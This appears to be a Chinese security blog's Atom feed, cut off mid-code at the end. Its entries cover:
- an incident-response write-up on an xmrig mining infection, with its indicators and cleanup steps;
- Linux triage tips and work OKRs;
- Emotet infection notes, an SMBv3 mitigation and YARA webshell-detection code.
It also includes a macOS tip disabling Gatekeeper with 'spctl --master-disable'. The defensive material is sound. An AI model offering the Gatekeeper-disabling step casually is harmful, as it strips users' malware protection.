<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术阿涛</title>
  
  <subtitle>这是一个小小的网站</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-16T03:03:44.044Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>XiongTaoTao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tp-viurs挖矿应急</title>
    <link href="http://example.com/2023/03/15/Tp-viurs%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/"/>
    <id>http://example.com/2023/03/15/Tp-viurs%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/</id>
    <published>2023-03-15T14:16:42.000Z</published>
    <updated>2023-03-16T03:03:44.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>客户服务器异常卡顿，请进行相关排查和处置并溯源攻击路径</p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>1.定位主机全部异常项目（异常进程、异常定时任务、异常文件等等）并进行相应处置</p><p>a)异常进程：&#x2F;root&#x2F;.configures&#x2F;xmrig</p><p>b)异常定时任务：&#x2F;root&#x2F;.configures&#x2F;ping.sh</p><p>c)异常外联通信：donate.v2.xmrig.com、199.247.27.41、178.128.242.134</p><p>d)异常服务：SystemRaid.service</p><p>e)异常文件：目录&#x2F;root&#x2F;.configures&#x2F;下挖矿病毒本体、挖矿配置文件等</p><p>f)异常库文件劫持：&#x2F;root&#x2F;.configures&#x2F;p.so</p><p>g)异常ssh公钥：&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><p>2.溯源攻击路径（需包含时间点和对应操作）</p><p>攻击者：192.168.100.253</p><p>本次攻击最早发起时间：2022.12.15 02:24</p><p>攻击方式：SSH爆破、SSH公钥登录</p><p>时间线梳理：</p><p>1)早期服务器遭受攻击，主机上留有SSH公钥，文件落地时间（2022.02.18 05:10）</p><p>2)攻击者通过SSH公钥登录，时间点2022.12.15 02:24</p><p>3)攻击者IP  192.168.100.253在时间点2022.12.15 02:24尝试SSH爆破</p><p>4)定时任务在时间点2022.12.15 02:29，随后02:30执行</p><p>5)攻击者IP  192.168.100.253登录成功，日志记录时间点2022.12.15 02:34</p><p>6)攻击者上传挖矿病毒等恶意文件，时间点2022.12.15 02:52</p><h1 id="一、排查确认"><a href="#一、排查确认" class="headerlink" title="一、排查确认"></a>一、排查确认</h1><p>1、根据现有情况，top命令未发现高占用进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315230843562.png" alt="image-20230315230843562"></p><p>2、结合服务器卡顿初步怀疑为感染蠕虫、挖矿等恶意病毒，查看网络连接未发现异常，随即通过tcpdump抓包</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232319724.png" alt="image-20230315232319724"></p><p>3、抓包发现异常域名请求，以及可疑外联IP，关联矿池威胁情报信息</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232505749.png" alt="image-20230315232505749"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232534006.png" alt="image-20230315232534006"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232542799.png" alt="image-20230315232542799"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232706378.png" alt="image-20230315232706378"></p><p>4、查看网络连接没有发现对应进程PID，推测可能为库文件劫持</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232910447.png" alt="image-20230315232910447"></p><p>5、下载busybox，发现库文件劫持，同时记录文件落地时间</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233131845.png" alt="image-20230315233131845"></p><p>6、清除对应库文件劫持，命令恢复正常，关联恶意外联对应进程、PID</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233421954.png" alt="image-20230315233421954"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233434354.png" alt="image-20230315233434354"></p><p>7、根据进程找到挖矿病毒本地，恶意文件同目录下还存在其他配置文件、启动脚本</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233659181.png" alt="image-20230315233659181"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233710381.png" alt="image-20230315233710381"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315234231104.png" alt="image-20230315234231104"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315234240840.png" alt="image-20230315234240840"></p><p>8、查看挖矿进程的相关信息，可以确认为计划任务拉起的挖矿进程，计划任务打开的程序为</p><p>&#x2F;root&#x2F;.configures&#x2F;ping.sh</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315235000939.png" alt="image-20230315235000939"></p><p>9、查看最早拉起进程PID信息，关联可疑服务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315235634675.png" alt="image-20230315235634675"></p><p>10、查看对应可疑服务，确认为拉起恶意挖矿进程服务，关联服务配置时间</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315235730110.png" alt="image-20230315235730110"></p><p>至此确认恶意服务配置拉起挖矿进程，且存在对应计划任务确保挖矿进程存活。同时发现挖矿病毒本体，以及同目录下库文件劫持、挖矿配置信息等恶意文件。</p><h1 id="二、溯源分析"><a href="#二、溯源分析" class="headerlink" title="二、溯源分析"></a>二、溯源分析</h1><p>1、在root用户目录下发现SSH公钥，同时还发现写入了其他恶意字符</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316100854298.png" alt="image-20230316100854298"></p><p>2、关联恶意文件、登录日志等创建时间分析</p><p>定时任务创建时间2022.12.15 02:29</p><p>定时任务执行时间2022.12.15 02:30</p><p>挖矿病毒落地时间2022.12.15 02:52</p><p>SSH公钥落地时间2022.02.18 05:10</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316101253066.png" alt="image-20230316101253066"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316101359784.png" alt="image-20230316101359784"></p><p>3、查看对应登录日志，发现IP 192.168.100.253在时间点2022.12.15 02:24尝试爆破，且在后续时间点2022.12.15 02:34发现成功登录日志</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316102236033.png" alt="image-20230316102236033"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316101621132.png" alt="image-20230316101621132"></p><p>4、但登录成功时间晚于定时任务执行时间，结合各个恶意文件落地时间，推测SSH公钥为入侵源头，且近一次访问时间在文件落地前，符合猜测</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316103825791.png" alt="image-20230316103825791"></p><p>5、总结：</p><p>攻击者：192.168.100.253</p><p>本次攻击最早发起时间：2022.12.15 02:24</p><p>攻击方式：SSH爆破、SSH公钥登录</p><p>时间线梳理：</p><p>1)早期服务器遭受攻击，主机上留有SSH公钥，文件落地时间（2022.02.18 05:10）</p><p>2)攻击者通过SSH公钥登录，时间点2022.12.15 02:24</p><p>3)攻击者IP  192.168.100.253在时间点2022.12.15 02:24尝试SSH爆破</p><p>4)定时任务在时间点2022.12.15 02:29，随后02:30执行</p><p>5)攻击者IP  192.168.100.253登录成功，日志记录时间点2022.12.15 02:34</p><p>6)攻击者上传挖矿病毒等恶意文件，时间点2022.12.15 02:52</p><h1 id="三、清理后门"><a href="#三、清理后门" class="headerlink" title="三、清理后门"></a>三、清理后门</h1><p>1、清除库文件劫持，命令恢复正常，挖矿进程取消隐藏</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316104702903.png" alt="image-20230316104702903"></p><p>2、删除计划任务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316104903592.png" alt="image-20230316104903592"></p><p>3、删除恶意服务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316105144896.png" alt="image-20230316105144896"></p><p>4、删除挖矿病毒目录下文件、SSH公钥</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316105338099.png" alt="image-20230316105338099"></p><p>5、终止当前挖矿进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316105927228.png" alt="image-20230316105927228"></p><p>6、进程、网络连接均未发现异常，重启服务器后无异常</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316110312786.png" alt="image-20230316110312786"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;客户服务器异常卡顿，请进行相关排查和处置并溯源攻击路径&lt;/p&gt;
&lt;h1 id=&quot;要求&quot;&gt;&lt;a href=&quot;#要求&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="应急响应" scheme="http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>重新学习</title>
    <link href="http://example.com/2023/03/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/03/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-03-15T12:12:09.000Z</published>
    <updated>2023-03-15T14:01:25.439Z</updated>
    
    <content type="html"><![CDATA[<p>Linux应急小Tips</p><p>下载busybox</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q --timeout=5 https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-x86_64 -O /tmp/busybox</span><br></pre></td></tr></table></figure><p>使用tcpdump抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0</span><br><span class="line">--简单粗暴</span><br></pre></td></tr></table></figure><p>Linux进程PID小知识</p><p>PID 分配上限可以通过 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 查询，一般默认为 32768。</p><p>对于 PID&lt;300 的情况只允许分配一次，一般对应了系统线程，所以一般进程 PID 分配范围是 (300, 32768) 。</p><p>每个 PID 分配成功后，会将当前的 PID 设置为 last_pid，下次便从 last_pid + 1 开始往下查找。</p><p>通过位图记录已分配和未分配 PID，单页为 4KB ，对应了默认的最大进程数 32768 。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linux应急小Tips&lt;/p&gt;
&lt;p&gt;下载busybox&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>工作定的小目标忽略忽略</title>
    <link href="http://example.com/2023/03/10/3-10/"/>
    <id>http://example.com/2023/03/10/3-10/</id>
    <published>2023-03-10T12:01:33.000Z</published>
    <updated>2023-03-11T08:03:54.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验"><a href="#O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验" class="headerlink" title="O(目标)-1保障好项目的质量，进一步提升内外部满意度(96%)和区域服务口碑和价值感知—服务体验"></a>O(目标)-1保障好项目的质量，进一步提升内外部满意度(96%)和区域服务口碑和价值感知—服务体验</h2><h3 id="关键结果KR-1"><a href="#关键结果KR-1" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>每周检视事件闭环工作，关注闭环时效，将事件跟踪表与交付物一并整理发送</p><h3 id="关键结果KR-2"><a href="#关键结果KR-2" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>针对事件较少客户（近一周无事件），主动分析设备日志，梳理外部攻击情况整理报告推送</p><h3 id="关键结果KR-3"><a href="#关键结果KR-3" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>通过资产梳理、暴露面梳理、威胁狩猎、免费重保等方式对感知度较低的客户提升感知</p><h3 id="关键结果KR-4"><a href="#关键结果KR-4" class="headerlink" title="关键结果KR-4"></a>关键结果KR-4</h3><p>根据客户不同需求，提供非标准化交付，例如：每月提供病毒主机，每周整理弱口令等</p><h2 id="O-目标-2实现续约率80-x2F-续费率100-x2F-转化率40-—客户经营"><a href="#O-目标-2实现续约率80-x2F-续费率100-x2F-转化率40-—客户经营" class="headerlink" title="O(目标)-2实现续约率80% &#x2F;续费率100%&#x2F;转化率40%—客户经营"></a>O(目标)-2实现续约率80% &#x2F;续费率100%&#x2F;转化率40%—客户经营</h2><h3 id="关键结果KR-1-1"><a href="#关键结果KR-1-1" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>加强客户预算管理意识，在预算前后有意识的开展主动服务，提供一到两次主动服务案例</p><h3 id="关键结果KR-2-1"><a href="#关键结果KR-2-1" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>持续提升测试效果和效率，确保个人测试项目转正率超过40%，关注组内测试项目，跟进项目满意度关键举措</p><h3 id="关键结果KR-3-1"><a href="#关键结果KR-3-1" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>参与中心相关意识培训，探讨扩容、增值服务的拓展思路，对小资产客户、续费风险客户进行风险提前识别和解决</p><h3 id="关键结果KR-4-1"><a href="#关键结果KR-4-1" class="headerlink" title="关键结果KR-4"></a>关键结果KR-4</h3><p>检视提供商机有效性，与销售或客户沟通，推动商机落地</p><h2 id="O-目标-3确保全年毛利55-—效率提升"><a href="#O-目标-3确保全年毛利55-—效率提升" class="headerlink" title="O(目标)-3确保全年毛利55%—效率提升"></a>O(目标)-3确保全年毛利55%—效率提升</h2><h3 id="关键结果KR-1-2"><a href="#关键结果KR-1-2" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>纯MSS客户，相关汇报、问题处置、应急响应等工作，在个人能力满足前提下尽可能由服务经理承接</p><h3 id="关键结果KR-2-2"><a href="#关键结果KR-2-2" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>加强客户经营意识，综合服务、联合交付等项目，在不影响客户满意度情况下，尽可能降低上门处置、汇报等经营成本</p><h3 id="关键结果KR-3-2"><a href="#关键结果KR-3-2" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>根据客户高潜、低潜客户筛选标准，减少不必要的消耗提升整体工作效率及人均效益（主要在主动服务上进行区分）</p><h2 id="O-目标-4任职晋级达到T2级别以上—个人提升"><a href="#O-目标-4任职晋级达到T2级别以上—个人提升" class="headerlink" title="O(目标)-4任职晋级达到T2级别以上—个人提升"></a>O(目标)-4任职晋级达到T2级别以上—个人提升</h2><h3 id="关键结果KR-1-3"><a href="#关键结果KR-1-3" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>积极参与运营中心服务经理技术能力提升专项，通过培训、实践、考核，年底任职晋级达到T2级别</p><h3 id="关键结果KR-2-3"><a href="#关键结果KR-2-3" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>参与网络安全实验室，积累优秀报告</p><h3 id="关键结果KR-3-3"><a href="#关键结果KR-3-3" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>针对Windows、Linux常见上机排查流程输出文档，上传知识库</p><h3 id="关键结果KR-4-2"><a href="#关键结果KR-4-2" class="headerlink" title="关键结果KR-4"></a>关键结果KR-4</h3><p>提升漏洞挖掘能力，类似（威胁狩猎、客户通报漏洞等）场景下，积累漏洞挖掘经验并记录文档</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验&quot;&gt;&lt;a href=&quot;#O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="工作" scheme="http://example.com/categories/%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="OKR" scheme="http://example.com/tags/OKR/"/>
    
  </entry>
  
  <entry>
    <title>service A Tao restart</title>
    <link href="http://example.com/2023/03/10/restart/"/>
    <id>http://example.com/2023/03/10/restart/</id>
    <published>2023-03-10T11:43:42.000Z</published>
    <updated>2023-03-15T14:17:29.897Z</updated>
    
    <content type="html"><![CDATA[<p>博客重新上线，哈哈啊哈哈&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;-</p><p>顺带记录下最近踩的坑</p><h3 id="Tips1"><a href="#Tips1" class="headerlink" title="Tips1"></a>Tips1</h3><p>无法打开应用，因为Apple无法检查其是否包含恶意软件解决方法</p><p>在应用程序-&gt;实用工具中找到<code>终端</code>，打开，执行下面一条命令，禁用新安全检查即可。</p><p>sudo spctl –master-disable</p><h3 id="Tips2"><a href="#Tips2" class="headerlink" title="Tips2"></a>Tips2</h3><p>测试图床Typora+PicGo+七牛云</p><p>参考链接：</p><p><code>https://blog.csdn.net/qq_45931842/article/details/119544403</code></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230310201154080.png" alt="image-20230310201154080"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;博客重新上线，哈哈啊哈哈&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;-&lt;/p&gt;
&lt;p&gt;顺带记录下最近踩的坑&lt;/p&gt;
&lt;h3 id=&quot;Tips1&quot;&gt;&lt;a href=&quot;#Tips1&quot; class=&quot;headerlink&quot; title=&quot;Tips1&quot;&gt;&lt;/a&gt;Ti</summary>
      
    
    
    
    <category term="踩坑" scheme="http://example.com/categories/%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="mac" scheme="http://example.com/tags/mac/"/>
    
    <category term="小技巧" scheme="http://example.com/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>3-24</title>
    <link href="http://example.com/2020/03/24/3.24/"/>
    <id>http://example.com/2020/03/24/3.24/</id>
    <published>2020-03-24T01:37:52.000Z</published>
    <updated>2020-03-24T10:43:11.362Z</updated>
    
    <content type="html"><![CDATA[<p>学习Emotet木马特征，以及python导入egg</p><span id="more"></span><h1 id="freebuf"><a href="#freebuf" class="headerlink" title="freebuf"></a>freebuf</h1><h2 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h2><p>面试题</p><blockquote><p><a href="https://www.freebuf.com/vuls/228750.html">https://www.freebuf.com/vuls/228750.html</a></p></blockquote><p>任意文件读取漏洞经验</p><blockquote><p><a href="https://www.freebuf.com/articles/web/229648.html">https://www.freebuf.com/articles/web/229648.html</a></p></blockquote><p>webug靶场通关记录</p><blockquote><p><a href="https://www.freebuf.com/articles/web/151617.html">https://www.freebuf.com/articles/web/151617.html</a></p></blockquote><h2 id="修复CVE-2020-0796漏洞"><a href="#修复CVE-2020-0796漏洞" class="headerlink" title="修复CVE-2020-0796漏洞"></a>修复CVE-2020-0796漏洞</h2><ol><li><p>腾讯电脑管家 <a href="http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe"><code>SMB漏洞修复工具</code></a></p></li><li><p>安天 <code>SMBv3</code> 的 <code>RCE</code><a href="https://bbs.antiy.cn/forum.php?mod=viewthread&tid=83848">漏洞强化工具</a></p></li><li><p>官方补丁 </p><blockquote><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a></p></blockquote></li><li><p>如无法立即安装补丁，建议禁用 SMBv3 压缩，添加DisableCompression项，无需重启，可以防止远程命令执行，但无法防止针对 SMB 客户端的攻击，<code>powershell</code>代码:</p></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure><h1 id="Emotet木马"><a href="#Emotet木马" class="headerlink" title="Emotet木马"></a>Emotet木马</h1><p><strong>什么是Emotet木马病毒？</strong></p><p>Emotet（也被称为Geodo或Heodo），一种模块化木马病毒，据称是由黑客组织Mealybug于2014年开发的。Emotet最初被设计为银行木马，被Mealybug用来通过垃圾电子邮件感染受害者设备，并在受害者登陆网银或加密钱包时窃取登陆凭证、个人身份信息（PII）和财务信息等。</p><p>不仅如此，Emotet在后续的发展中还被添加了传播其他恶意软件的能力，包括其他银行木马（如Trickbot）。</p><p><strong>恶意文档分为两类</strong></p><p>在今年1月份，用来传播Emotet木马的恶意文档主要可以分为两类：第一类约占80%，虽然它们具有.doc扩展名，但实际上是XML文件；第二类则是典型的带有嵌入式恶意宏的Word文档。</p><p>Menlo Security公司表示，将具有Base64编码数据的XML文档伪装成Word文档可能是为了逃避杀毒软件的检测。实际上，确实只有很少的杀毒软件能将这些用来传播Emotet木马的文档检测为“恶意”。</p><p>虽然不同的恶意文档使用了的标题和内容也不尽相同，但几乎都使用了Microsoft Office的logo来诱使攻击目标启用恶意宏。</p><p><strong>感染过程十分复杂</strong></p><p>Menlo Security公司表示，新的Emotet变种的感染过程非常复杂，并遵循一个严格的流程。初始恶意脚本会生成多个进程，而这些进程将启动一个Powershell脚本，以将主有效载荷下载到受感染计算机的TEMP文件夹中。</p><p>一旦主有效载荷被下载到受感染计算机，它就将会被激活，并开始向包含在一个命令和控制服务器（C2）网址列表中的所有网址按顺序发出连接请求。一旦连接成功，Emotet与攻击者的C2服务器也就建立了连接，而攻击者便可以通过C2通信来发送其他恶意软件。</p><p><strong>实际分析对象</strong></p><p>接触到的样本情况是，感染主机有数个下载者要求攻击溯源，在经历了镜像格式转换、关键文件位置排查、日志筛选，在powershell日志中找到了可疑记录。通过排查时间线，找到了可疑服务的开启，接着锁定时间在邮件中找到相关的样本。直接发现可疑邮件附带的doc文档，逆向分析发现有宏代码，打开执行powershell，具体操作从CC列表中下载exe文件，且有多个CC备用，下载成功之后解密出shellcode复制本身到服务目录下，之后释放文件消除痕迹。</p><p><strong>freebuf分析</strong></p><blockquote><p><a href="https://www.freebuf.com/articles/terminal/180390.html">https://www.freebuf.com/articles/terminal/180390.html</a></p></blockquote><h1 id="毕业设计"><a href="#毕业设计" class="headerlink" title="毕业设计"></a>毕业设计</h1><h2 id="关于sys-path-append"><a href="#关于sys-path-append" class="headerlink" title="关于sys.path.append()"></a>关于sys.path.append()</h2><blockquote><p><a href="https://www.cnblogs.com/mandy-study/p/7735801.html">https://www.cnblogs.com/mandy-study/p/7735801.html</a>)</p></blockquote><p>当我们导入一个模块时：import  xxx，默认情况下python解析器会搜索当前目录、已安装的内置模块和第三方模块，搜索路径存放在<strong>sys模块的path</strong>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**[python]** [view plain]</span><br><span class="line"></span><br><span class="line">(http://blog.csdn.net/jojoy_tester/article/details/54575264#) [copy](http://blog.csdn.net/jojoy_tester/article/details/54575264#)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[print](http://blog.csdn.net/jojoy_tester/article/details/54575264#)[?](http://blog.csdn.net/jojoy_tester/article/details/54575264#)</span><br><span class="line"></span><br><span class="line">1. \&gt;&gt;&gt; import sys </span><br><span class="line">2. \&gt;&gt;&gt; sys.path </span><br><span class="line"></span><br><span class="line">[&#x27;&#x27;, &#x27;C:\\Python352\\Lib\\idlelib&#x27;, &#x27;C:\\Python352\\python35.zip&#x27;, &#x27;C:\\Python352\\DLLs&#x27;, &#x27;C:\\Python352\\lib&#x27;, &#x27;C:\\Python352&#x27;, &#x27;C:\\Python352\\lib\\site-packages&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\setuptools-28.6.1-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\pip-8.1.2-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\requests-2.11.1-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\xlutils-2.0.0-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\xlwt-1.1.2-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\pymongo-3.3.1-py3.5-win-amd64.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\pytz-2016.7-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\zope.interface-4.3.3-py3.5-win-amd64.egg&#x27;] </span><br></pre></td></tr></table></figure><p>此时sys.path 返回的是一个列表！该路径已经添加到系统的环境变量了，当我们要添加自己的搜索目录时，可以通过列表的append()方法</p><p>1.对于模块和自己写的脚本不在同一个目录下，在脚本开头加sys.path.append(‘xxx’)：</p><p>eg.　　import sys </p><p>　　　 sys.path.append(’引用模块的地址’) </p><p>2.把路径添加到系统的环境变量，或把该路径的文件夹放进已经添加到系统环境变量的路径内。环境变量的内容会自动添加到模块搜索路径中。</p><p>p.s.可以通过dir(sys)来查看他里面的方法和成员属性。</p><h2 id="关于python2和3适配"><a href="#关于python2和3适配" class="headerlink" title="关于python2和3适配"></a>关于python2和3适配</h2><p>在开头加上from <strong>future</strong> import print_function这句之后，即使在python2.X，使用print就得像python3.X那样加括号使用。python2.X中print不需要括号，而在python3.X中则需要。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># python2.7</span><br><span class="line">print &quot;Hello world&quot;</span><br><span class="line"></span><br><span class="line"># python3</span><br><span class="line">print(&quot;Hello world&quot;)</span><br></pre></td></tr></table></figure><p>　　如果某个版本中出现了某个新的功能特性，而且这个特性和当前版本中使用的不兼容，也就是它在该版本中不是语言标准，那么我如果想要使用的话就需要从future模块导入。</p><p>　　其他例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import division</span><br><span class="line">from __future__ import absolute_import</span><br><span class="line">from __future__ import with_statement</span><br></pre></td></tr></table></figure><p>　　加上这些，如果你的python版本是python2.X，你也得按照python3.X那样使用这些函数</p><h2 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h2><p>利用yara规则匹配检测webshell</p><p>导入egg包</p><p>调用公用检测函数</p><p>编译yara规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def getRules(self, yara):</span><br><span class="line">    index = 0</span><br><span class="line">    filepath = &#123;&#125;</span><br><span class="line">    for dirpath, dirs, files in os.walk(self.rule):</span><br><span class="line">    #os.walk() 方法是一个简单易用的文件、目录遍历器。</span><br><span class="line">        for file in files:</span><br><span class="line">            ypath = os.path.join(dirpath, file)</span><br><span class="line">            key = &quot;rule&quot; + str(index)</span><br><span class="line">            filepath[key] = ypath</span><br><span class="line">            index += 1</span><br><span class="line">            #遍历文件</span><br><span class="line">    yararule = yara.compile(filepaths=filepath)</span><br><span class="line">    return yararule</span><br></pre></td></tr></table></figure><p>根据版本导入yara模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">def init_scan(self):</span><br><span class="line">       suspicious, malice, skip = False, False, False</span><br><span class="line">       try:</span><br><span class="line">           SYS_PATH = get_value(&#x27;SYS_PATH&#x27;)</span><br><span class="line">           #绝对路径</span><br><span class="line">           if sys.version_info &lt; (3, 0):</span><br><span class="line">           #根据python版本导入模块</span><br><span class="line">               DEPENDENT_LIBRARIES_2_6 = &quot;/lib/egg/yara_python-3.5.0-py2.6-linux-2.32-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_3_10 = 